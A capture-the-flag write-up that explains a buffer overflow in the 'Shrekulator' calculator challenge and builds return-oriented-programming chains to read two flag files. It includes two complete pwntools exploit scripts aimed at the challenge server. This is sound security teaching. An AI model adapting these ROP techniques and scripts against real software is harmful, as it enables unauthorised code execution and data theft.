# CTF League - Shrekulator

## Return Oriented Programming
Return oriented programming is a more advanced binary exploitation method that involves using buffer overflow vulnerabilities to modify stack return addresses, similar to a ret2win ctf, but where you chain several return jumps together to modify state, building gadgets which use existing structure in the code to manipulate state for use in an attack.

## Flag 1
For the first flag, we had to use this program to read a file called f1.txt. There was a function `print_file` which would do this very thing, we first needed a buffer overflow that allows us to call `print_file`.

This program was designed as a reverse polish notation calculator, which had an operation that set the max stack size to 256. However the original defintion of the max stack size is declared as `0256` which defined it as an octal value, or 174 decimal. Because the buffer is not resized here, sending the command `o 2` gives lots of extra space to write to.

```c
#define STACK_BUF 0256
...
if (buf[1] == ' ' && buf[2] != '\0' && buf[3] == '\0') {
max_stack_size = 256;
max_instrs = 256;
```
Because of the way this program processes it's input, we need to send our `o 2` with a newline, then 181 "1 " and we get a crash, confirming our write to the stack.

Unfortunately, we can't just call put the `print_file` address here, because it takes the parameters that we need to configure. The two tamper variables are straightforward enough, the `tamper2` check can be skipped entirely by jumping to the address after that check, rather then the function label.

```c
void print_file(char *name, long int tamper1, long int tamper2) {
  if (tamper2 != 67) {
    return;
  }

  FILE *file = fopen(name, "r");
  if (tamper1 != 67) {
    fclose(file);
    play("f1.txt");
    return;
  }

  long int c;
  while ((c = getc(file)) != EOF) {
    putchar(c);
  }
  fclose(file);

  putchar('\n');
}
```

Looking at the assembly, `tamper1` is stored in `rsi`, which is where rop comes in. Using pwntools, we can build rop gadgets that set registers to values we need, such as the following:

```py
elf = ELF('./main')
rop = ROP(elf)
rop.rsi = 67        # rsi is tamper1
rop.raw(0x40188f)   # jump to print_file, skip tamper2 check
```

With the tamper checks taken care we now have the bigger problem, loading a pointer to an "f1.txt" string into `rdi`. Thankfully for us, that string is in the binary. And since the program follows a consistent calling convetion and it's the first argument of a function, that pointer is actually loaded into `rdi`. 

```s
4018af:	48 8d 3d d6 07 00 00 	lea    0x7d6(%rip),%rdi        # 40208c  <_IO_stdin_used+0x8c>
4018b6:	e8 3d 00 00 00       	call   4018f8 <play>
```

This means that if we first jump to the load effective address instruction at `0x4018af`, we can load rdi with the correct string, then after the call to `play()` we can can add the original rop of skipping to `print_file` to our rop chain. We'll also need to add three padding pops to the ROP object to handle the return stack operations internal to the play function.

Similar to the buffer overflow, we will have to format our rop chain to be space seperated numbers like the following:

```py
chain = " ".join([f"{u64(bytes(x))}" for x in batched(rop.chain(), 8)])  
```

By appending that to our buffer overflow, we can succesfully chain our returns to configure the proper register values and jump to the `print_file` function with `f1.txt` as an argument to get the first flag.

### Exploit Script
```py
#!/usr/bin/env python3
from pwn import *
from itertools import batched

context.arch = "amd64"

elf = ELF('./main')
rop = ROP(elf)
rop.raw(0x4018af)   # load `f1.txt` to rdi via play() 
rop.raw(0)          # padding
rop.raw(0)          # padding
rop.raw(0)          # padding
rop.rsi = 67        # rsi is tamper1
rop.raw(0x40188f)   # jump to print_file, skip tamper2 check

# p = process('./main')
p = remote('shrekulator.ctf-league.damsec.org', 1310)

chain = " ".join([f"{u64(bytes(x))}" for x in batched(rop.chain(), 8)])  

# Expand Max Stack Size and overflow with rop chain
p.sendline(b'o 2')
p.sendline(b'1 ' * 181 + chain.encode())

p.interactive()
```

## Flag 2

For Flag 2 the idea was very similar to the first flag, as we needed to read a file named `f2.txt`, unfortunately the string `f2.txt` is not present in the program, which means we'll need to both insert the string, and then find a pointer to is location in memory. Since `f2.txt` is small enough, we can encode it as an integer that will fit in a register with:

```py
p.sendline(str(u64(b'f2.txt'.ljust(8, b'\x00'), endianness='little')).encode())
```
That can then be sent as the operator for a function using the rpn calculators `f funcname` syntax. This is extremely useful as the interpret step of function calls uses the operator itself as a pointer to offset by, and we need to somehow load that pointer into `rdi`. 

```c
case CALL:
        if (!r_interpret(&functions[instrs->fun_id * INSTR_BUF], fun_lens[instrs->fun_id])) { return false; }
        break;
```

In the binary, we can see that the pointer we want is added to `rdi`. So we can begin our rop chain by clearing `rdi` to 0, then adding jumping to this instruction to add our pointer into `rdi`.

```s
40154a:	48 03 3d af 3b 00 00 	add    0x3baf(%rip),%rdi        # 405100 <functions>
```
After it loads our value into `rdi`, the interpret function is called recursively, but we can cause it to fail immediately by setting the register `rsi` which is used for the `size_t len` to a value greater than `INSTR_BUF` to force it to immediately return.

```c
bool r_interpret(Operation *instrs, size_t len) {
  if (len >= INSTR_BUF) {
    return false;
  }
```

With that part of the chain complete, we have `rdi` set to f2.txt and we already have (from the first flag) a way to print from a string in `rdi`, we can reuse that and with some padding for pop instructions and rets, the final chain is complete, granting flag 2.

### Exploit Script
```py
#!/usr/bin/env python3
from pwn import *
from itertools import batched

context.arch = "amd64"

elf = ELF('./main')
rop = ROP(elf)
rop.rdi = 0         # Clear RDI for pointer offset
rop.rsi = 99999     # Force recursive interpret to fail early
rop.raw(0x40154a)   # Jump to interpret call 
rop.raw(0)          # pad 2 for add SP
rop.raw(0)
rop.raw(0)          # pad 3 for pop insts
rop.raw(0)
rop.raw(0)
rop.rsi = 67        # rsi is tamper1
rop.raw(0x40188f)   # open file

# p = process('./main')
p = remote('shrekulator.ctf-league.damsec.org', 1310)

chain = " ".join([f"{u64(bytes(x))}" for x in batched(rop.chain(), 8)])   

# Create function with body (operation union) containing encoded `f2.txt` 
p.sendline(b'f func')
p.sendline(str(u64(b'f2.txt'.ljust(8, b'\x00'), endianness='little')).encode())

# Expand max stack size and execute rop
p.sendline(b'o 2')
p.sendline(b'1 ' * 181 + chain.encode())

p.interactive()
```